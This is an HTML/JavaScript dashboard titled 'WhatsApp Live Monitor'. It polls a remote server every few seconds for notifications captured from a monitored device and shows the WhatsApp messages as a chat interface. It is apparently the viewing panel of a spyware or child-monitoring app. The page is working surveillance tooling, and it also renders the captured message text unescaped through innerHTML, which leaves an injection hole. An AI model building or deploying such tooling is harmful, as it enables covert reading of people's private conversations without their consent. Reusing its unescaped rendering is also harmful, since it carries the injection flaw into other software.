<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Live Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- CSS STYLES (WhatsApp Dark Mode) --- */
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar */
        .sidebar { width: 350px; background-color: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; height: 100%; }
        .header { background-color: #202c33; padding: 15px; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; color: #aebac1; }
        
        .contact-list { flex: 1; overflow-y: auto; }
        
        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; height: 55px; } 
        .contact:hover { background-color: #2a3942; }
        .contact.active { background-color: #2a3942; }

        .avatar { width: 45px; height: 45px; background-color: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 15px; flex-shrink: 0; font-size: 18px; font-weight: bold; }
        .info { flex: 1; display: flex; flex-direction: column; justify-content: center; }
        .name { font-size: 17px; color: #e9edef; font-weight: 500; }
        .last-msg { font-size: 13px; color: #8696a0; margin-top: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 200px; }

        /* Chat Area */
        .chat-area { flex: 1; display: flex; flex-direction: column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; position: relative; }
        
        .chat-header { background-color: #202c33; padding: 10px 15px; display: flex; align-items: center; border-bottom: 1px solid #374045; }
        .mobile-back { display: none; margin-right: 15px; font-size: 20px; color: #aebac1; cursor: pointer; }

        .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; }
        
        /* ðŸ”¥ BUBBLES (Left vs Right) */
        .msg { 
            max-width: 65%; 
            padding: 6px 10px; 
            border-radius: 8px; 
            font-size: 14.5px; 
            line-height: 1.4; 
            word-wrap: break-word; 
            color: #e9edef; 
            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); 
            position: relative; 
            margin-bottom: 4px;
        }
        
        /* Received (Left - Gray) */
        .msg.incoming {
            background-color: #202c33;
            align-self: flex-start; 
            border-top-left-radius: 0;
        }

        /* Sent (Right - Green) */
        .msg.outgoing {
            background-color: #005c4b;
            align-self: flex-end; 
            border-top-right-radius: 0;
        }
        
        .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 6px; }
        .welcome-screen { position: absolute; top:0; left:0; width:100%; height:100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #222e35; z-index: 5; text-align: center; }

        /* Debug Box */
        #status-bar { position: fixed; bottom: 0; left: 0; background: #00a884; color: white; padding: 5px 10px; font-size: 12px; display: none; z-index: 100; }

        @media (max-width: 768px) {
            .sidebar { width: 100%; position: absolute; z-index: 20; }
            .chat-area { width: 100%; position: absolute; z-index: 10; display: none; } 
            .mobile-back { display: block; }
            .welcome-screen { display: none; }
            body.chat-active .sidebar { display: none; }
            body.chat-active .chat-area { display: flex; }
        }
    </style>
</head>
<body>

    <div class="sidebar" id="sidebar">
        <div class="header">
            <span>Chats</span>
            <div style="display:flex; gap:15px;">
                 <i class="fas fa-trash" onclick="clearData()" style="cursor:pointer; font-size:14px;" title="Clear"></i>
                 <i class="fas fa-sync-alt" onclick="fetchData()" style="cursor:pointer;" title="Refresh"></i>
            </div>
        </div>
        <div class="contact-list" id="contactList">
            <div style="text-align:center; padding:20px; color:#8696a0;">Connecting to Server...</div>
        </div>
    </div>

    <div class="chat-area" id="chatArea">
        <div class="welcome-screen" id="welcomeScreen">
            <i class="fab fa-whatsapp" style="font-size: 60px; color: #3d4a51; margin-bottom: 20px;"></i>
            <div style="font-size: 24px;">WhatsApp Monitor</div>
            <div style="font-size: 14px; color: #8696a0; margin-top: 10px;">Select a contact to view history</div>
        </div>

        <div class="chat-header" id="chatHeader" style="display:none;">
            <i class="fas fa-arrow-left mobile-back" onclick="closeChat()"></i>
            <div class="avatar" id="headerAvatar"></div>
            <div style="font-size: 16px; font-weight: 500;" id="headerName">Name</div>
        </div>

        <div class="messages" id="messageBox"></div>
    </div>
    
    <div id="status-bar"></div>

    <script>
        // ðŸ”¥ CONFIGURATION
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id'); // ID URL se lega

        // Server URL (Ensure this matches your Render URL)
        const BASE_URL = "https://child-v9no.onrender.com";
        const API_URL = `${BASE_URL}/api/get-data/${deviceId}/notifications`;

        const STORAGE_KEY = `whatsapp_v2_${deviceId || 'demo'}`;
        let groupedChats = {};
        let activeChatUser = null; 

        // Initial Check
        if (!deviceId) {
            document.getElementById('contactList').innerHTML = `<div style="padding:20px; color:red; text-align:center">Error: ID Missing.<br>Add ?id=YOUR_DEVICE_ID to URL</div>`;
        }

        // 1. FETCH DATA
        async function fetchData() {
            if (!deviceId) return;
            showStatus("Fetching...");
            
            try {
                const res = await fetch(API_URL);
                if (!res.ok) throw new Error("Server Error or No Data");
                
                const data = await res.json();
                
                // DATA PROCESSING
                processData(data);
                showStatus("Updated: " + new Date().toLocaleTimeString());

            } catch (e) {
                console.error("Fetch Error:", e);
                showStatus("Error fetching data (Server might be sleeping)");
            }
        }

        // 2. PROCESS & GROUP MESSAGES
        function processData(data) {
            if (!data || !Array.isArray(data) || data.length === 0) {
                if (Object.keys(groupedChats).length === 0) {
                    document.getElementById('contactList').innerHTML = `<div style="text-align:center; padding:20px; color:#8696a0;">No Data on Server yet.</div>`;
                }
                return;
            }

            let tempGrouped = {};
            
            data.forEach(msg => {
                // Filter: Only WhatsApp
                const appName = (msg.packageName || msg.appName || msg.app || "").toLowerCase();
                if (!appName.includes('whatsapp')) return;

                // Sender Name identify karna
                let sender = msg.title || "Unknown";
                
                // Agar sender "WhatsApp" hai, to ignore karo (ye system notification hoti hai)
                if (sender === "WhatsApp") return;

                if (!tempGrouped[sender]) tempGrouped[sender] = [];
                
                // Data normalize karna (Time, Text)
                tempGrouped[sender].push({
                    text: msg.text || msg.message || "",
                    time: msg.postTime || msg.timestamp || Date.now(),
                    isSelf: (msg.title === "You" || msg.title === "Me" || (msg.text && msg.text.startsWith("You:")))
                });
            });

            // Save & Render
            if (Object.keys(tempGrouped).length > 0) {
                groupedChats = tempGrouped;
                localStorage.setItem(STORAGE_KEY, JSON.stringify(groupedChats));
                renderSidebar();
                if (activeChatUser) renderMessages(activeChatUser, true);
            }
        }

        // 3. RENDER SIDEBAR
        function renderSidebar() {
            const list = document.getElementById('contactList');
            list.innerHTML = "";
            
            const sortedNames = Object.keys(groupedChats).sort((a, b) => {
                const msgsA = groupedChats[a];
                const msgsB = groupedChats[b];
                return msgsB[msgsB.length - 1].time - msgsA[msgsA.length - 1].time;
            });

            sortedNames.forEach(name => {
                const msgs = groupedChats[name];
                const lastMsg = msgs[msgs.length - 1];
                
                const div = document.createElement('div');
                div.className = 'contact';
                if (name === activeChatUser) div.classList.add('active');
                div.onclick = () => openChat(name);
                
                div.innerHTML = `
                    <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                    <div class="info">
                        <div style="display:flex; justify-content:space-between; width:100%;">
                            <span class="name">${name}</span>
                            <span style="font-size:11px; color:#8696a0;">${formatTime(lastMsg.time)}</span>
                        </div>
                        <div class="last-msg">${lastMsg.text}</div>
                    </div>
                `;
                list.appendChild(div);
            });
        }

        // 4. RENDER MESSAGES (Left/Right Logic)
        function renderMessages(name, isAutoRefresh) {
            const box = document.getElementById('messageBox');
            const isScrolledToBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 100;

            if (!groupedChats[name]) return;

            let html = "";
            let uniqueMsgs = [];
            let lastTxt = "";

            // Simple Deduplication
            groupedChats[name].sort((a,b) => a.time - b.time).forEach(m => {
                if (m.text === lastTxt) return;
                uniqueMsgs.push(m);
                lastTxt = m.text;
            });

            uniqueMsgs.forEach(msg => {
                // Determine Class: Incoming or Outgoing
                // Agar title "You" hai ya text "You:" se start ho raha hai -> Outgoing
                let msgClass = "incoming";
                let displayText = msg.text;

                if (msg.isSelf || displayText.startsWith("You:")) {
                    msgClass = "outgoing";
                    displayText = displayText.replace(/^You:\s*/, ""); // "You:" à¤¹à¤Ÿà¤¾ à¤¦à¥‹
                }

                html += `
                    <div class="msg ${msgClass}">
                        ${displayText}
                        <span class="time">${formatTime(msg.time)}</span>
                    </div>`;
            });

            box.innerHTML = html;

            if (!isAutoRefresh || isScrolledToBottom) {
                box.scrollTop = box.scrollHeight;
            }
        }

        function openChat(name) {
            activeChatUser = name;
            document.body.classList.add('chat-active');
            document.getElementById('welcomeScreen').style.display = 'none';
            document.getElementById('chatHeader').style.display = 'flex';
            document.getElementById('headerName').innerText = name;
            document.getElementById('headerAvatar').innerText = name.charAt(0).toUpperCase();
            renderSidebar();
            renderMessages(name, false);
        }

        function closeChat() {
            activeChatUser = null;
            document.body.classList.remove('chat-active');
            renderSidebar();
        }

        function formatTime(ts) {
            return new Date(parseInt(ts)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        }

        function showStatus(msg) {
            const el = document.getElementById('status-bar');
            el.innerText = msg;
            el.style.display = 'block';
            setTimeout(() => el.style.display = 'none', 3000);
        }

        function clearData() {
            if(confirm("Clear Local Cache?")) {
                localStorage.removeItem(STORAGE_KEY);
                location.reload();
            }
        }

        // STARTUP
        // 1. Local data load karo
        const saved = localStorage.getItem(STORAGE_KEY);
        if(saved) { groupedChats = JSON.parse(saved); renderSidebar(); }

        // 2. Fetch start karo
        fetchData();
        setInterval(fetchData, 4000); // Har 4 second me refresh

    </script>
</body>
</html>
